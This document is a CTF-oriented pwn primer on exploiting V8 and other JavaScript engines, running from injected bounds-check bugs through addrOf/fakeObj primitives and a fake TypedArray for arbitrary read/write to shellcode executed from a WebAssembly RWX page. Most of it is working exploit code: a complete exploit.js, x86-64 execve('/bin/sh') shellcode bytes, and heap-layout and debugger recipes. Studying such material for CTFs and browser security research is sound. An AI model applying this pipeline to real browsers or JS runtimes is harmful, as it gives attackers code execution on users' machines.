---
title: "V8 / JS Engine Pwn Primer - addrOf, fakeObj and the Road to RCE"
category: pwn
subcategory: browser
type: technique
tags: [browser, v8, javascript, jit, typed-array, arraybuffer, addrof, fakeobj, map-confusion, shape, hidden-class, pointer-compression, wasm, rwx, oob-array, d8, pwntools, gdb]
difficulty: insane
summary: "Turn a JS engine bug into an OOB array, then addrOf/fakeObj, then an arbitrary read/write TypedArray, then shellcode in a WebAssembly RWX page."
when_to_use:
  - "The challenge ships a patched d8 / JavaScriptCore / SpiderMonkey plus the diff"
  - "You have an out-of-bounds read or write on a JS array"
  - "You can make two objects of different types share a backing store (type confusion)"
  - "You need the standard exploitation pipeline once you have a primitive"
tools: [d8, gdb, pwndbg, gef, ninja, gn]
related: [browser-vm-escape-primer, heap-write-targets, heap-internals-primer, kernel-mitigations]
---

## TL;DR

Every JS engine exploit follows the same five steps: **bug -> OOB access -> addrOf and
fakeObj -> arbitrary read/write -> code execution**. In V8 the last step is almost
always "find the RWX page that WebAssembly's JIT allocated, memcpy shellcode into it,
and call the wasm function". Everything in between is pointer arithmetic on V8's object
layout.

## Recognise it

- The challenge gives you `d8` (V8's shell) plus a `.patch` against `v8/src/...`.
- The patch adds a builtin like `Array.prototype.oob()` or removes a bounds check in
  the JIT's `CheckBounds` elimination.
- `%DebugPrint(obj)` works - the binary was built with `--allow-natives-syntax`.
- The flag is read by a shell, so you need real code execution, not just memory access.

## Vulnerable code shape

The two classic injected-bug shapes:

```c
// (a) an added builtin with an off-by-one or missing check
// src/builtins/builtins-array.cc
BUILTIN(ArrayOob) {
  uint32_t len = args.length();
  if (len > 2) return ReadOnlyRoots(isolate).undefined_value();
  Handle<JSArray> array = Handle<JSArray>::cast(args.receiver());
  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
  uint32_t length = static_cast<uint32_t>(array->length().Number());
  if (len == 1) {
    // BUG: reads index `length`, one past the end
    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
  }
  elements.set(length, args.at(1)->Number());   // BUG: OOB write
  return ReadOnlyRoots(isolate).undefined_value();
}
```

```c
// (b) a Turbofan typer bug: the compiler believes a narrower range than reality
// src/compiler/typer.cc
Type Typer::Visitor::TypeNumberMax(Type lhs, Type rhs) {
  ...
  // BUG: returns Range(min, max-1) so a later CheckBounds is elided
  return Type::Range(lhs.Min(), rhs.Max() - 1, zone());
}
```

In JS you then coax the JIT into compiling a function whose bounds check is removed:

```javascript
function f(i) {
    let a = [1.1, 2.2, 3.3];
    let idx = Math.max(i, 0);          // typer says [0, 2], really can be 3+
    return a[idx];
}
for (let i = 0; i < 100000; i++) f(0); // warm up Turbofan
f(1000);                                // OOB
```

## Theory

Targets: V8 8.x - 12.x. The concepts transfer to JSC (butterflies) and SpiderMonkey
(shapes + slots), only the field offsets change.

### V8 object layout

With **pointer compression** (default since V8 8.0 on 64-bit), every heap pointer is a
32-bit offset from a 4 GB-aligned "cage base", so your leaks are `uint32` values.
Small integers ("Smi") are the value shifted left by 1 with the low bit 0; heap
objects have the low bit **1** (`kHeapObjectTag`), so a "pointer" you read is
`real_address + 1`.

```
JSArray (packed doubles)        FixedDoubleArray
  +0x00 map                       +0x00 map
  +0x04 properties                +0x04 length (Smi)
  +0x08 elements ---------------> +0x08 element[0]  (raw IEEE754, NOT tagged)
  +0x0c length (Smi)              +0x10 element[1]

JSArrayBuffer                   JSTypedArray
  +0x00 map                       +0x00 map
  +0x04 properties                +0x04 properties
  +0x08 elements                  +0x08 elements
  +0x0c byte_length               +0x0c byte_offset
  +0x14 backing_store             +0x14 byte_length
        (FULL 64-bit pointer)     +0x1c external_pointer  (full 64-bit)
                                  +0x24 base_pointer
```

The two facts that make everything work:

1. A `FixedDoubleArray` stores raw doubles - no tagging. So if you can read an
   *object* array's slot as a double, you see the raw (compressed) pointer.
2. A `JSTypedArray`'s `external_pointer` is a full 64-bit address that the engine
   trusts completely. Overwrite it and `arr[i]` reads/writes anywhere.

### addrOf and fakeObj

Given an OOB read/write on a `FixedDoubleArray` that is adjacent to a
`FixedArray` (an object array):

```javascript
// two arrays allocated back to back
let float_arr = [1.1, 1.1, 1.1, 1.1];   // FixedDoubleArray, raw doubles
let obj_arr   = [{}, {}, {}, {}];       // FixedArray, tagged pointers

// addrOf: put the victim in obj_arr, read its slot through float_arr's OOB
function addrOf(o) {
    obj_arr[0] = o;
    return f2i(float_arr[OOB_IDX]) & 0xffffffffn;   // low 32 bits = compressed ptr
}

// fakeObj: write an address into obj_arr's slot through float_arr's OOB
function fakeObj(addr) {
    float_arr[OOB_IDX] = i2f(addr);
    return obj_arr[0];                               // engine treats it as an object
}
```

The float/int conversion is the one piece of boilerplate every exploit needs:

```javascript
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u64 = new BigUint64Array(buf);
function f2i(f) { f64[0] = f; return u64[0]; }
function i2f(i) { u64[0] = BigInt(i); return f64[0]; }
```

### Map / shape confusion

The `map` (V8) / `structure` (JSC) / `shape` (SpiderMonkey) pointer at offset 0 tells
the engine what the object *is*. Swap the map of a double-field object onto a
pointer-field object and every access reinterprets tagged pointers as doubles:

```javascript
let a = {x: 1.1};          // double field
let b = {x: {}};           // pointer field
// leak both maps, then use a 4-byte relative write to give b the map of a:
//   reading b.x  -> the pointer AS A DOUBLE       -> addrOf
//   writing b.x  -> a double AS A POINTER         -> fakeObj
```

This is the "one shot" version and needs only a 4-byte relative write at offset 0.

### From fakeObj to arbitrary read/write

Build a fake `JSTypedArray` inside a double array you control - its `external_pointer`
field is the address the engine will read and write:

```javascript
let container = [
    i2f(map_and_properties_copied_from_a_real_Float64Array),
    i2f(elements_and_byte_offset),
    i2f(byte_length),
    i2f(0x41414141n),          // external_pointer <- the address to touch
];
let fake = fakeObj(addrOf(container) + 0x10n);   // point at the fake header
fake[0];                                          // reads *external_pointer
```

In modern V8 the more robust route is to get *one* arbitrary write and use it on a
**real** `DataView`/`TypedArray`'s `backing_store`, then use that object from then on -
no fighting with map checks.

### From arbitrary R/W to code execution

1. **WebAssembly RWX page** - the standard. Instantiate a minimal module; the
   `WasmInstanceObject` holds a `jump_table_start` pointer into a page the wasm JIT
   mapped RWX. `read64` it, `write64` your shellcode there, call the exported
   function. Newer builds with `--write-protect-code-memory` / MAP_JIT break this;
   then you JIT-spray immediate constants inside a Turbofan-compiled function.

2. **The V8 sandbox (heap cage)** - since ~V8 10.x, `external_pointer` fields live in
   an external pointer table and raw 64-bit pointers inside the cage are not trusted,
   so arbitrary read/write inside the cage is not process memory. A build with
   `v8_enable_sandbox` expects you to find a sandbox escape - usually the point.

3. **Overwrite a function pointer** in a non-sandboxed structure, or corrupt
   `ArrayBuffer::backing_store` (outside the cage in older builds).

## Attack

Assuming a patched `d8` with an `oob()` builtin:

1. Boilerplate: `f2i`/`i2f` converters.
2. Allocate `float_arr` (doubles) and `obj_arr` (objects) adjacently; find the OOB
   index that reads `obj_arr`'s elements by planting a marker object and scanning.
3. Implement `addrOf` and `fakeObj`.
4. Leak the map of a `Float64Array` (or build the fake header from a real one).
5. Build a fake `JSTypedArray` in a double array; `fakeObj` it.
6. Implement `read64`/`write64` by rewriting the fake object's `external_pointer`.
7. Instantiate a WebAssembly module; `addrOf` the instance; read the RWX code pointer.
8. `write64` your shellcode into the RWX page.
9. Call the exported wasm function.

## Heap state

```text
step 2: the adjacency you need (V8 allocates in order)

  0x1c2508  FixedDoubleArray (float_arr.elements)
            +0x00 map
            +0x04 length = 4
            +0x08 [0] 1.1
            +0x10 [1] 1.1
            +0x18 [2] 1.1
            +0x20 [3] 1.1
  0x1c2530  FixedArray       (obj_arr.elements)      <- float_arr[OOB_IDX] lands here
            +0x00 map
            +0x04 length = 4
            +0x08 [0] compressed ptr to {}           <- addrOf reads this
            +0x0c [1] ...


step 5: the fake JSTypedArray inside a double array

  container.elements
    +0x08  | map(Float64Array) | properties |   <- copied from a real one
    +0x10  | elements          | byte_offset|
    +0x18  | byte_length = 0x1000            |
    +0x20  | external_pointer = TARGET       |   <- we rewrite this per access
    +0x28  | base_pointer = 0                |

  fakeObj(addrOf(container) + 0x08 + 1)  ->  a "TypedArray" at TARGET
  fake[0] reads *(double*)TARGET


step 7-9: wasm RWX

  WasmInstanceObject
    +0x?? jump_table_start ------> RWX page (mapped rwx by the wasm JIT)
                                     | 0x90 0x90 ... | <- memcpy shellcode here
  inst.exports.main()  ->  jumps into the RWX page  ->  execve("/bin/sh")
```

## Exploit

```javascript
// exploit.js - the canonical V8 pipeline. Run with:
//   ./d8 --allow-natives-syntax exploit.js
// Offsets are build specific: confirm every one with %DebugPrint.

// ---------- 1. float/int conversion boilerplate ----------
const conv_buf = new ArrayBuffer(8);
const f64 = new Float64Array(conv_buf);
const u64 = new BigUint64Array(conv_buf);
const u32 = new Uint32Array(conv_buf);

function f2i(f) { f64[0] = f; return u64[0]; }
function i2f(i) { u64[0] = BigInt(i); return f64[0]; }
function hex(v) { return "0x" + v.toString(16); }

function log(msg) { console.log("[*] " + msg); }
function ok(msg)  { console.log("[+] " + msg); }

// ---------- 2. the OOB primitive (challenge specific) ----------
// Replace `oob_read` / `oob_write` with whatever the patch gives you.
let float_arr = [1.1, 1.1, 1.1, 1.1];
let obj_arr   = [{}, {}, {}, {}];

// With an `Array.prototype.oob()` style builtin:
function oob_read(idx)       { return float_arr[idx]; }        // no bounds check
function oob_write(idx, val) { float_arr[idx] = val; }

// Distance (in 8-byte slots) from float_arr's elements to obj_arr's elements.
// Find it by planting a marker and scanning; hardcode once known.
const OOB_ELEMENTS_DELTA = 6;

// ---------- 3. addrOf / fakeObj ----------
function addrOf(obj) {
    obj_arr[0] = obj;
    const raw = f2i(oob_read(OOB_ELEMENTS_DELTA));
    return raw & 0xffffffffn;          // compressed pointer, tagged (low bit 1)
}

function fakeObj(addr) {
    oob_write(OOB_ELEMENTS_DELTA, i2f(addr & 0xffffffffn));
    return obj_arr[0];
}

// ---------- 4. arbitrary read/write via a fake TypedArray ----------
// Copy a real Float64Array's header so the map and element kind are valid.
const real_ta = new Float64Array(0x100);
const real_ta_addr = addrOf(real_ta);
log("real Float64Array @ " + hex(real_ta_addr));

// The fake header lives inside a double array we fully control.
let fake_backing = [
    i2f(0n), i2f(0n), i2f(0n), i2f(0n),
    i2f(0n), i2f(0n), i2f(0n), i2f(0n),
];

let arb = null;

function build_fake_typed_array(header_words) {
    for (let i = 0; i < header_words.length; i++)
        fake_backing[i] = i2f(header_words[i]);
    const base = addrOf(fake_backing);
    // +0x08 skips the elements-array header; +1 re-applies the heap object tag.
    return fakeObj(base + 0x08n + 1n);
}

function set_target(addr) {
    // external_pointer is the 4th qword of our fake header (index 3).
    fake_backing[3] = i2f(addr);
}

function read64(addr) {
    set_target(addr);
    return f2i(arb[0]);
}

function write64(addr, value) {
    set_target(addr);
    arb[0] = i2f(value);
}

// ---------- 5. WebAssembly RWX page ----------
// A minimal module exporting `main` that returns 42. Generated once with wat2wasm.
const WASM_BYTES = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
    0x03, 0x02, 0x01, 0x00,
    0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
]);

// execve("/bin/sh", 0, 0) - x86-64, no null bytes in the important parts.
const SHELLCODE = [
    0x48, 0x31, 0xd2,                               // xor rdx, rdx
    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e,       // mov rbx, '//bin/sh'
    0x2f, 0x73, 0x68,
    0x48, 0xc1, 0xeb, 0x08,                         // shr rbx, 8
    0x53,                                           // push rbx
    0x48, 0x89, 0xe7,                               // mov rdi, rsp
    0x52,                                           // push rdx
    0x57,                                           // push rdi
    0x48, 0x89, 0xe6,                               // mov rsi, rsp
    0xb0, 0x3b,                                     // mov al, 59
    0x0f, 0x05,                                     // syscall
];

// Offset of the RWX code pointer inside WasmInstanceObject. BUILD SPECIFIC.
const WASM_JUMP_TABLE_OFFSET = 0x68n;

function pwn() {
    // Build the fake TypedArray header from the real one's map/properties.
    const map_and_props = read64_bootstrap(real_ta_addr - 1n);
    arb = build_fake_typed_array([
        map_and_props,        // map | properties
        0n,                   // elements | byte_offset
        0x1000n,              // byte_length
        0n,                   // external_pointer  <- rewritten per access
        0n, 0n, 0n, 0n,
    ]);
    ok("arbitrary read/write online");

    const wasm_mod = new WebAssembly.Module(WASM_BYTES);
    const wasm_inst = new WebAssembly.Instance(wasm_mod, {});
    const main = wasm_inst.exports.main;
    log("wasm main() = " + main());

    const inst_addr = addrOf(wasm_inst);
    const rwx = read64(inst_addr - 1n + WASM_JUMP_TABLE_OFFSET);
    ok("RWX page @ " + hex(rwx));

    // Copy the shellcode a qword at a time.
    for (let i = 0; i < SHELLCODE.length; i += 8) {
        let word = 0n;
        for (let j = 7; j >= 0; j--)
            word = (word << 8n) | BigInt(SHELLCODE[i + j] || 0x90);
        write64(rwx + BigInt(i), word);
    }
    ok("shellcode written, calling main()");
    main();
}

// Bootstrap read used only to copy the real TypedArray's header, before `arb`
// exists. With an OOB read this is just another relative read; with a pure
// fakeObj primitive, read it through a second fake object.
function read64_bootstrap(addr) {
    // Placeholder: on most challenges the OOB read reaches far enough.
    // Replace with the relative read that covers `addr`.
    return f2i(oob_read(OOB_ELEMENTS_DELTA + 2));
}

pwn();
```

## Variants & pitfalls

- **Every offset is build specific.** Use `%DebugPrint(obj)` in `d8
  --allow-natives-syntax` and `gdb`'s `job` command (V8 ships gdb macros in
  `tools/gdbinit`) instead of copying offsets from a write-up.
- **Pointer compression** means addresses are 32-bit *offsets*. `addrOf` returns a
  uint32; the cage base comes from any full pointer you can read.
- **The low bit.** Heap object pointers are tagged with 1. Subtract it before using an
  address as a base, add it before handing an address to `fakeObj`.
- **GC will eat your fake objects.** Keep strong references to every array you use as a
  fake backing store, and avoid allocating between building and using a fake object.
- **Element kinds.** `[1.1, 2.2]` is `PACKED_DOUBLE_ELEMENTS`; `[1, 2]` is
  `PACKED_SMI_ELEMENTS`; inserting an object transitions the array and reallocates the
  backing store, moving it away from your OOB index.
- **The V8 sandbox.** If the build has `v8_enable_sandbox = true`, arbitrary read/write
  inside the cage does **not** give you process memory, and the wasm RWX trick is gone.
  Read the `args.gn` the challenge ships.
- **`--write-protect-code-memory` / `--jitless`** similarly close the wasm route.
- **JSC and SpiderMonkey** use the same pipeline: JSC's `butterfly` replaces
  `elements`, and its `structure` replaces `map`; SpiderMonkey's `shape` + `slots`.
  The addrOf/fakeObj construction is identical.

## Debugging

```text
# in d8:
%DebugPrint(obj)                 # prints map, elements, and the raw address
%SystemBreak()                   # int3, so you can attach
%CollectGarbage("")              # force a GC to test object lifetime
%HaveSameMap(a, b)
%OptimizeFunctionOnNextCall(f)   # force Turbofan for a typer bug
%DisassembleFunction(f)

# in gdb (after `source v8/tools/gdbinit`):
gdb> job 0x1c2508                # pretty-print a V8 object
gdb> jco <code address>
gdb> telescope <addr> 20
gdb> vmmap                       # find the rwx wasm page
```

```bash
# Build d8 with the challenge's patch and their args.gn.
gn gen out/x64.release --args="$(cat args.gn)"
ninja -C out/x64.release d8
# Run with natives so %DebugPrint works.
./out/x64.release/d8 --allow-natives-syntax exploit.js
# Confirm whether the sandbox is on:
grep -E 'v8_enable_sandbox|v8_enable_pointer_compression' args.gn
```

## Tools

- `d8` with `--allow-natives-syntax`.
- `v8/tools/gdbinit` (`job`, `jco`) inside gdb/pwndbg.
- `wat2wasm` from the WebAssembly Binary Toolkit to build the minimal module.
- `pwntools` `asm()` to generate the shellcode bytes.

## References

- V8 source: `src/objects/js-array-buffer.h`, `src/objects/js-objects.h`,
  `src/compiler/typer.cc`.
- `v8/tools/gdbinit` for the debugger integration.
